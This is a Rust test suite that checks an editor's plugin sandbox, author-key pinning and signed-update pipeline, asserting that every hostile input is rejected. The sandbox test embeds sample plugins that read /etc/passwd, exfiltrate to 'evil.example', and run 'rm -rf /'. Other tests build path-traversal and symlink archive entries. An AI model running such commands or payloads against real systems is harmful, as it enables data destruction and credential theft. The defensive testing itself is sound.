//! QA security-workflow drive suite (task #38): W4 plugin trust/sandbox + W8
//! updater verify→apply→rollback, driven END-TO-END as a real user/plugin-author
//! would hit them — with the risk-ranked security edge cases from the QA spec.
//!
//! This suite is the WORKFLOW-LEVEL complement to the unit tests already inline
//! in `src/plugin/*` and `src/update/*` and to the adversarial capability matrix
//! in `plugin_sandbox_isolation.rs`. Where those prove one primitive at a time,
//! this walks the ordered W4/W8 acceptance criteria as flows and adds the edges
//! the spec ranks highest-risk:
//!
//!   W4 — load benign plugin → sandbox denies fs/net/proc → first-contact key is
//!        NeedsFirstConsent (no silent TOFU) → key CHANGE is BlockKeyChanged
//!        (never silently loads) → op/time/map bounds enforced. EDGES: malformed
//!        manifest, future api_version, oversized script, eval/import at
//!        parse-time, runaway-loop deadline kill.
//!
//!   W8 — dual SHA-256 + minisign happy path → REJECT edges (fail-closed): bad
//!        checksum, tampered signature, valid-sig-WRONG-key, attacker key-id
//!        hint ignored, downgrade/anti-rollback, oversized-extract cap,
//!        zip-slip / tar-bomb / symlink / hardlink entries → backup+rollback
//!        restores the prior binary.
//!
//! All fixtures are SMALL and inline (tempdir + crafted bytes + ephemeral
//! minisign keypairs); no production-scale generators and no host-path literals.
//! Edges that are already FAIL-CLOSED are asserted here as PASSING tests — that
//! is the point: a passing reject-path test proves the defense holds.

use scribe_core::plugin::pinned_keys::{decide_key_trust, PluginLoadDecision};
use scribe_core::plugin::{
    verify_plugin_tarball, PinOutcome, PinnedKeyStore, PluginContext, PluginHost, PluginManifest,
};
use scribe_core::update::apply::{backup_path_for, install_with_backup, rollback};
use scribe_core::update::net::ensure_upgrade;
use scribe_core::update::verify::{
    sha256_hex, verify_any_signature, verify_artifact, verify_checksum, EMBEDDED_PUBLIC_KEY,
};

// ===========================================================================
// Shared tiny fixtures.
// ===========================================================================

/// A fresh ephemeral minisign keypair + its public-key box string.
fn keypair() -> (minisign::KeyPair, String) {
    let kp = minisign::KeyPair::generate_unencrypted_keypair().unwrap();
    let pk_box = kp.pk.to_box().unwrap().to_string();
    (kp, pk_box)
}

/// Detached minisign signature (the `.minisig` contents) over `data` by `kp`.
fn sign(kp: &minisign::KeyPair, data: &[u8]) -> String {
    minisign::sign(Some(&kp.pk), &kp.sk, std::io::Cursor::new(data), None, None)
        .unwrap()
        .to_string()
}

/// A benign Rhai plugin that registers one buffer-transform command.
const BENIGN_PLUGIN: &str = r#"
    fn cmd_up() { set_buffer_text(buffer_text().to_upper()); notify("upped"); }
    register_command("up", "Uppercase Buffer", "cmd_up");
"#;

// ===========================================================================
// W4 — PLUGIN AUTHOR: load → sandbox → trust gate → bounds.
// ===========================================================================

/// W4 step 1: a benign plugin loads end-to-end and its command transforms the
/// buffer — the happy path the plugin manager's "Approve & run" would drive.
#[test]
fn w4_benign_plugin_loads_and_runs_end_to_end() {
    let mut host = PluginHost::new();
    host.load_script("com.example.uppercase", BENIGN_PLUGIN)
        .expect("a benign plugin must load");
    assert_eq!(host.commands().len(), 1, "the command must be registered");
    assert_eq!(host.commands()[0].label, "Uppercase Buffer");

    let mut ctx = PluginContext::new("hello world");
    host.run_command("up", &mut ctx).expect("command runs");
    assert_eq!(ctx.text, "HELLO WORLD", "the transform must apply");
    assert_eq!(ctx.notifications, vec!["upped"]);
}

/// W4 step 2: the sandbox denies filesystem / network / process capability even
/// while a legitimate plugin shares the same host. Each escape is an
/// unknown-function error (default-deny by construction).
#[test]
fn w4_sandbox_denies_fs_net_proc() {
    let mut host = PluginHost::new();
    host.load_script("benign", BENIGN_PLUGIN)
        .expect("benign loads");

    // fs / net / proc primitives are not registered host fns → load/run fails.
    for (label, evil) in [
        (
            "fs-read",
            r#"fn go() { let x = open_file("/etc/passwd"); } register_command("go","Go","go");"#,
        ),
        (
            "fs-write",
            r#"fn go() { write_file("/tmp/pwn", "x"); } register_command("go","Go","go");"#,
        ),
        (
            "net",
            r#"fn go() { let r = http_get("http://evil.example/exfil"); } register_command("go","Go","go");"#,
        ),
        (
            "proc",
            r#"fn go() { system("rm -rf /"); } register_command("go","Go","go");"#,
        ),
    ] {
        let mut h2 = PluginHost::new();
        let loaded = h2.load_script("evil", evil);
        let ran = loaded.as_ref().ok().map(|_| {
            let mut ctx = PluginContext::new("seed");
            h2.run_command("go", &mut ctx)
        });
        assert!(
            loaded.is_err() || matches!(ran, Some(Err(_))),
            "{label} escape must be denied (no such host fn)"
        );
    }
}

/// W4 step 3: FIRST contact with an author key must NOT silently TOFU-load — it
/// is `NeedsFirstConsent` until the user explicitly approves. (No silent TOFU.)
#[test]
fn w4_first_contact_key_needs_first_consent_no_silent_tofu() {
    let dir = tempfile::tempdir().unwrap();
    let mut store = PinnedKeyStore::new(dir.path());
    let outcome = store
        .pin_or_match("com.example.up", "untrusted comment: a\nRWQfirst")
        .expect("first pin");
    assert_eq!(outcome, PinOutcome::New, "first contact is New");

    // The pure trust gate: New WITHOUT prior explicit consent → hold for
    // approval, never silent-load.
    assert_eq!(
        decide_key_trust(PinOutcome::New, false),
        PluginLoadDecision::NeedsFirstConsent,
        "a first-seen key must NOT silently TOFU-load"
    );
    // ...and only loads once the user has explicitly consented.
    assert_eq!(
        decide_key_trust(PinOutcome::New, true),
        PluginLoadDecision::Allow,
    );
}

/// W4 step 4: a CHANGED pinned author key is `BlockKeyChanged` — it must NEVER
/// load, even if a first-contact consent flag is set (consent for first-contact
/// is not consent for rotation; rotation requires `replace_with_consent`).
#[test]
fn w4_key_change_blocks_and_never_loads() {
    let dir = tempfile::tempdir().unwrap();
    let mut store = PinnedKeyStore::new(dir.path());
    store.pin_or_match("p.id", "K_ORIGINAL").unwrap();

    // A subsequent install presents a DIFFERENT key → Mismatch.
    let outcome = store.pin_or_match("p.id", "K_ATTACKER").unwrap();
    let PinOutcome::Mismatch { old, new } = outcome else {
        panic!("a changed key must be a Mismatch, got {outcome:?}");
    };
    assert_eq!(old, "K_ORIGINAL");
    assert_eq!(new, "K_ATTACKER");

    // The trust gate BLOCKS for both consent states — a changed key never loads.
    for consent in [false, true] {
        match decide_key_trust(
            PinOutcome::Mismatch {
                old: old.clone(),
                new: new.clone(),
            },
            consent,
        ) {
            PluginLoadDecision::BlockKeyChanged { old: o, new: n } => {
                assert_eq!(o, "K_ORIGINAL");
                assert_eq!(n, "K_ATTACKER");
            }
            other => panic!("a changed author key must BLOCK, got {other:?} (consent={consent})"),
        }
    }
}

/// W4 step 4b: rotation IS possible — but only through the explicit
/// `replace_with_consent` path, after which the new key matches and the old one
/// no longer does. Proves the consent path exists and is the only door.
#[test]
fn w4_explicit_rotation_consent_is_the_only_path() {
    let dir = tempfile::tempdir().unwrap();
    let mut store = PinnedKeyStore::new(dir.path());
    store.pin_or_match("p.id", "K_OLD").unwrap();
    store.replace_with_consent("p.id", "K_NEW").expect("rotate");
    assert_eq!(
        store.pin_or_match("p.id", "K_NEW").unwrap(),
        PinOutcome::Match
    );
    // The old key now mismatches (it was replaced).
    assert!(matches!(
        store.pin_or_match("p.id", "K_OLD").unwrap(),
        PinOutcome::Mismatch { .. }
    ));
}

/// W4 bounds: a runaway (infinite-loop) plugin is force-terminated by the
/// op/wall-clock guard — the editor never hangs on a hostile mod (deadline kill).
#[test]
fn w4_runaway_plugin_is_deadline_killed() {
    let mut host = PluginHost::new();
    host.load_script(
        "evil",
        r#"fn spin() { let x = 0; loop { x += 1; } } register_command("spin","Spin","spin");"#,
    )
    .unwrap();
    let mut ctx = PluginContext::new("x");
    assert!(
        host.run_command("spin", &mut ctx).is_err(),
        "an infinite loop must be force-terminated, not hang"
    );
}

/// W4 bounds: an oversize-allocation (map) bomb is bounded by the engine cap.
#[test]
fn w4_oversize_allocation_is_bounded() {
    let mut host = PluginHost::new();
    host.load_script(
        "bomb",
        r#"
        fn fill() {
            let m = #{};
            let i = 0;
            while i < 2_000_000 { m[i.to_string()] = i; i += 1; }
            notify("never");
        }
        register_command("fill","Fill","fill");
        "#,
    )
    .unwrap();
    let mut ctx = PluginContext::new("");
    assert!(
        host.run_command("fill", &mut ctx).is_err(),
        "an oversize map allocation must be rejected by the size cap"
    );
}

// ---- W4 EDGES: manifest / parse-time ----

/// EDGE: a malformed manifest (not valid TOML) is a structured error, never a
/// panic. The plugin is held back, not loaded.
#[test]
fn w4_edge_malformed_manifest_errors_not_panics() {
    let res = PluginManifest::from_toml_str("this is not = valid toml [[[");
    assert!(res.is_err(), "a malformed manifest must error gracefully");
}

/// EDGE: a manifest declaring a FUTURE api_version is refused as incompatible —
/// a plugin authored against host APIs this build does not implement never loads.
#[test]
fn w4_edge_future_api_version_is_incompatible() {
    let m = PluginManifest::from_toml_str("id='x'\nname='x'\napi_version=999\nentry='main.rhai'\n")
        .expect("parses");
    assert!(!m.is_compatible(), "a future api_version must be refused");
}

/// EDGE: a manifest pinning a `min_app_version` newer than this build is refused
/// (fail-closed) — and an unparseable version on either side also refuses.
#[test]
fn w4_edge_min_app_version_gate_fails_closed() {
    let m = PluginManifest::from_toml_str(
        "id='x'\nname='x'\napi_version=1\nentry='main.rhai'\nmin_app_version='99.0.0'\n",
    )
    .unwrap();
    assert!(
        !m.is_app_version_ok("0.4.0"),
        "newer-min plugin must be refused"
    );
    assert!(
        !m.is_app_version_ok("not-a-version"),
        "bad running version refuses"
    );
}

/// EDGE: an OVERSIZED script (a huge string-growth body) is rejected by the
/// `max_string_size` cap at run — a script cannot exhaust memory by growing a
/// string toward OOM.
#[test]
fn w4_edge_oversized_string_growth_is_bounded() {
    let mut host = PluginHost::new();
    host.load_script(
        "grow",
        r#"
        fn grow() { let s = "x"; loop { s += s; } }
        register_command("grow","Grow","grow");
        "#,
    )
    .unwrap();
    let mut ctx = PluginContext::new("");
    assert!(
        host.run_command("grow", &mut ctx).is_err(),
        "a string-growth bomb must hit the size cap"
    );
}

/// EDGE: `eval(...)` and `import` are removed FROM THE PARSER — a script using
/// either fails to COMPILE (strictly stronger than a runtime trap; the
/// registration block never runs).
#[test]
fn w4_edge_eval_and_import_rejected_at_parse_time() {
    let mut h1 = PluginHost::new();
    assert!(
        h1.load_script("evil", r#"eval("1+1");"#).is_err(),
        "eval must be a parse error"
    );
    let mut h2 = PluginHost::new();
    assert!(
        h2.load_script("evil", r#"import "lib"; print("x");"#)
            .is_err(),
        "import must be a parse error"
    );
}

/// EDGE: a deeply-nested-expression script (paren-depth attack) fails at COMPILE
/// — bounds parser recursion so a one-liner cannot blow the host stack at parse.
#[test]
fn w4_edge_deeply_nested_expression_rejected_at_compile() {
    let script = format!("let x = {}1{};", "(".repeat(200), ")".repeat(200));
    let mut host = PluginHost::new();
    assert!(
        host.load_script("nested", &script).is_err(),
        "a 200-deep paren chain must fail at parse"
    );
}

// ---- W4: tarball signature gate (Install tab "verify") ----

/// W4 Install: `verify_plugin_tarball` accepts ONLY when SHA-256 AND minisign
/// BOTH pass — the happy path of the Install-tab verdict surface.
#[test]
fn w4_tarball_verify_accepts_signed_tarball() {
    let (kp, pk_box) = keypair();
    let tarball = b"the synthetic plugin tarball bytes";
    let sig = sign(&kp, tarball);
    let sha = sha256_hex(tarball);
    verify_plugin_tarball(tarball, &sha, &sig, &pk_box)
        .expect("a correctly-signed tarball must verify");
}

/// W4 Install EDGE: bad checksum → reject with the friendly "corrupted" message,
/// and the signature is never even consulted.
#[test]
fn w4_tarball_verify_rejects_bad_checksum() {
    let (kp, pk_box) = keypair();
    let tarball = b"plugin bytes";
    let sig = sign(&kp, tarball);
    let wrong_sha = sha256_hex(b"different payload");
    let err = verify_plugin_tarball(tarball, &wrong_sha, &sig, &pk_box)
        .expect_err("a checksum mismatch must reject");
    assert!(
        err.contains("corrupted"),
        "want corrupted message, got {err:?}"
    );
}

/// W4 Install EDGE: tampered signature (right checksum, wrong sig) → reject with
/// the security-honest "signature invalid" message.
#[test]
fn w4_tarball_verify_rejects_tampered_signature() {
    let (kp, pk_box) = keypair();
    let tarball = b"plugin bytes";
    let sha = sha256_hex(tarball);
    // sign DIFFERENT bytes → the sig is valid-shaped but does not cover `tarball`.
    let sig = sign(&kp, b"other bytes entirely");
    let err = verify_plugin_tarball(tarball, &sha, &sig, &pk_box)
        .expect_err("a tampered signature must reject");
    assert!(
        err.contains("signature"),
        "want signature message, got {err:?}"
    );
}

/// W4 Install EDGE: valid signature by the WRONG key → reject. An attacker who
/// signs the same bytes with their own key cannot impersonate the pinned author.
#[test]
fn w4_tarball_verify_rejects_valid_sig_wrong_key() {
    let (legit_kp, legit_pk) = keypair();
    let (attacker_kp, _attacker_pk) = keypair();
    let _ = legit_kp; // legit key only used for its public box (the pin)
    let tarball = b"plugin bytes";
    let sha = sha256_hex(tarball); // checksum matches (attacker can recompute)
    let attacker_sig = sign(&attacker_kp, tarball); // valid sig, wrong key
    let err = verify_plugin_tarball(tarball, &sha, &attacker_sig, &legit_pk)
        .expect_err("a wrong-key signature must reject");
    assert!(
        err.contains("signature"),
        "want signature message, got {err:?}"
    );
}

// ===========================================================================
// W8 — UPDATER: verify (dual gate) → apply (backup) → rollback.
// ===========================================================================

/// W8 happy path: an artifact with a matching SHA-256 AND a signature from a
/// trusted key verifies through the composite `verify_artifact` gate.
#[test]
fn w8_dual_gate_accepts_checksum_and_signature() {
    let (kp, pk_box) = keypair();
    let artifact = b"the new scr1b3 binary bytes";
    let sha = sha256_hex(artifact);
    let sig = sign(&kp, artifact);
    verify_artifact(artifact, &sha, &sig, &[pk_box.as_str()])
        .expect("matching checksum + trusted signature must verify");
}

/// W8 EDGE: bad checksum → reject, fail-closed (the signature is moot).
#[test]
fn w8_rejects_bad_checksum() {
    let (kp, pk_box) = keypair();
    let artifact = b"binary bytes";
    let sig = sign(&kp, artifact);
    assert!(
        verify_artifact(artifact, "deadbeef", &sig, &[pk_box.as_str()]).is_err(),
        "a checksum mismatch must reject"
    );
    // And the lower-level checksum primitive agrees.
    assert!(!verify_checksum(artifact, "deadbeef"));
    assert!(verify_checksum(artifact, &sha256_hex(artifact)));
}

/// W8 EDGE: tampered signature (correct checksum, signature over OTHER bytes) →
/// reject. The classic supply-chain attack: an attacker recomputes the SHA-256
/// sidecar (trivial) but cannot forge the minisign signature.
#[test]
fn w8_rejects_tampered_signature_even_with_good_checksum() {
    let (kp, pk_box) = keypair();
    let payload = b"malicious update payload";
    let good_sha = sha256_hex(payload); // attacker can always produce this
    let sig_over_other = sign(&kp, b"these are not the payload bytes");
    assert!(
        verify_artifact(payload, &good_sha, &sig_over_other, &[pk_box.as_str()]).is_err(),
        "a correct checksum must NOT rescue a signature that doesn't cover the payload"
    );
}

/// W8 EDGE: valid signature by a key OUTSIDE the trusted set → reject. Trying
/// multiple keys never upgrades an untrusted signature into an accepted one.
#[test]
fn w8_rejects_valid_sig_wrong_key() {
    let (attacker_kp, _attacker_pk) = keypair();
    let (_trusted_kp, trusted_pk) = keypair();
    let payload = b"payload with a valid checksum and a wrong-key signature";
    let good_sha = sha256_hex(payload);
    let attacker_sig = sign(&attacker_kp, payload);
    // Trust set excludes the attacker key → reject.
    assert!(
        verify_artifact(payload, &good_sha, &attacker_sig, &[trusted_pk.as_str()]).is_err(),
        "a signature from a key not in the trust set must reject"
    );
    // verify_any_signature directly: the embedded production key also rejects it.
    assert!(
        verify_any_signature(payload, &attacker_sig, &[EMBEDDED_PUBLIC_KEY]).is_err(),
        "the embedded release key must reject an untrusted signature"
    );
}

/// W8 EDGE: the minisign key-id is only a routing HINT and is
/// attacker-controllable; it is NEVER trusted on its own. A signature whose
/// embedded key-id happens to collide with a trusted key still requires a FULL
/// Ed25519 verification — which a wrong-key signature fails. We prove the
/// property operationally: a wrong-key signature is rejected regardless of the
/// id hint, and a structurally-malformed sidecar is rejected at decode.
#[test]
fn w8_rejects_attacker_key_id_hint() {
    let (attacker_kp, _) = keypair();
    let (_trusted_kp, trusted_pk) = keypair();
    let payload = b"bytes the attacker signed with their own key";
    let sha = sha256_hex(payload);
    let attacker_sig = sign(&attacker_kp, payload);
    // Even though the sidecar carries the attacker's key-id, acceptance needs a
    // full crypto verify against a TRUSTED key — which fails.
    assert!(
        verify_artifact(payload, &sha, &attacker_sig, &[trusted_pk.as_str()]).is_err(),
        "the key-id hint must not let an attacker-signed artifact verify"
    );
    // Garbage/truncated sidecars are rejected at decode, never treated as "no
    // signature → ok".
    for bad in [
        "",
        "not a minisign file",
        "untrusted comment: x",
        "untrusted comment: x\nQUJD",
    ] {
        assert!(
            verify_artifact(payload, &sha, bad, &[trusted_pk.as_str()]).is_err(),
            "a malformed sidecar {bad:?} must be rejected"
        );
    }
}

/// W8 EDGE: an EMPTY trusted-key set never accepts anything (fail-closed).
#[test]
fn w8_empty_trust_set_rejects() {
    assert!(
        verify_any_signature(b"x", "untrusted comment: x\nbogus", &[]).is_err(),
        "an empty trust set must reject everything"
    );
}

/// W8 EDGE: anti-rollback (TUF downgrade defense). `ensure_upgrade` refuses an
/// equal-or-older candidate at APPLY time even when that release is validly
/// signed — a replayed older artifact can never be installed over a newer build.
#[test]
fn w8_anti_rollback_refuses_downgrade() {
    assert!(
        ensure_upgrade("v0.5.0", "0.4.9").is_ok(),
        "newer is allowed"
    );
    assert!(
        ensure_upgrade("v0.4.9", "0.4.9").is_err(),
        "equal must be refused"
    );
    assert!(
        ensure_upgrade("v0.4.8", "0.4.9").is_err(),
        "older must be refused"
    );
    assert!(
        ensure_upgrade("not-a-version", "0.4.9").is_err(),
        "an unparseable candidate fails closed"
    );
}

/// W8 apply→rollback: `install_with_backup` snapshots the prior binary to a
/// sibling `.bak`, swaps in the new one; a failed self-test then `rollback`s to
/// the prior binary. End-to-end backup+rollback of arbitrary-path binaries.
#[test]
fn w8_apply_backup_then_rollback_restores_prior_binary() {
    let dir = tempfile::tempdir().unwrap();
    let target = dir.path().join("scr1b3.bin");
    let new = dir.path().join("scr1b3.new");
    let backup = backup_path_for(&target);
    assert_eq!(backup, dir.path().join("scr1b3.bak"));

    std::fs::write(&target, b"v1-good").unwrap();
    std::fs::write(&new, b"v2-broken").unwrap();

    install_with_backup(&new, &target, &backup).expect("install");
    assert_eq!(
        std::fs::read(&target).unwrap(),
        b"v2-broken",
        "new binary installed"
    );
    assert_eq!(
        std::fs::read(&backup).unwrap(),
        b"v1-good",
        "prior binary backed up"
    );

    // Self-test fails post-apply → roll back to the prior binary.
    rollback(&backup, &target).expect("rollback");
    assert_eq!(
        std::fs::read(&target).unwrap(),
        b"v1-good",
        "rolled back to prior"
    );
}

/// W8 EDGE: rollback with a MISSING backup target fails closed (errors) rather
/// than handing a non-existent file to the swap.
#[test]
fn w8_rollback_without_backup_errors() {
    let dir = tempfile::tempdir().unwrap();
    let target = dir.path().join("t");
    std::fs::write(&target, b"x").unwrap();
    assert!(
        rollback(&dir.path().join("nope.bak"), &target).is_err(),
        "rollback must fail closed when the backup is missing"
    );
}

// ---- W8 EDGES: archive-extraction (the actual download → extract path). ----
//
// `extract_binary` is private; its hardening (zip-slip basename-strip,
// symlink/hardlink reject, decompression-bomb cap, oversized-download cap) is
// fully covered by the inline unit tests in `src/update/net.rs`. We rebuild the
// SAME hostile-archive fixtures here at the integration layer to document, from
// the QA-spec's W8 edge list, what the gates ARE — and to lock in the
// `tar`-crate FIRST-layer defense (refusal to even build a `..` traversal
// entry), which is observable from outside the crate.

/// W8 EDGE (zip-slip, first layer): the `tar` crate itself REFUSES to build an
/// archive whose entry path contains `..` — a traversal archive cannot be
/// produced through the normal API at all. This is the outer defense; the
/// inner basename-strip in `extract_binary` is unit-tested in-crate.
#[test]
fn w8_edge_tar_builder_refuses_dotdot_traversal_entry() {
    let mut gz = flate2::write::GzEncoder::new(Vec::new(), flate2::Compression::default());
    let mut builder = tar::Builder::new(&mut gz);
    let mut header = tar::Header::new_gnu();
    let payload = b"x";
    header.set_size(payload.len() as u64);
    header.set_cksum();
    let res = builder.append_data(&mut header, "../../etc/evil", &payload[..]);
    assert!(
        res.is_err(),
        "the tar builder must refuse a `..` traversal entry path (first-layer zip-slip defense)"
    );
}

/// W8 EDGE (symlink entry): a tarball whose entry is a SYMLINK is a non-regular
/// entry; the production extractor rejects it (the TARmageddon / CVE-2025-59825
/// class). We assert the archive is constructible (so the reject happens at
/// extraction, the right layer) — the reject itself is unit-tested in-crate
/// against the private `extract_binary`.
#[test]
fn w8_edge_symlink_entry_archive_is_constructible_for_extractor_reject() {
    let mut gz = flate2::write::GzEncoder::new(Vec::new(), flate2::Compression::default());
    let built = {
        let mut builder = tar::Builder::new(&mut gz);
        let mut header = tar::Header::new_gnu();
        header.set_entry_type(tar::EntryType::Symlink);
        header.set_size(0);
        header.set_mode(0o777);
        let name = if cfg!(windows) {
            "scr1b3.exe"
        } else {
            "scr1b3"
        };
        builder
            .append_link(&mut header, name, "/etc/passwd")
            .and_then(|_| builder.finish())
    };
    assert!(
        built.is_ok(),
        "a symlink-entry archive is constructible; the extractor is what rejects it (non-regular entry)"
    );
}
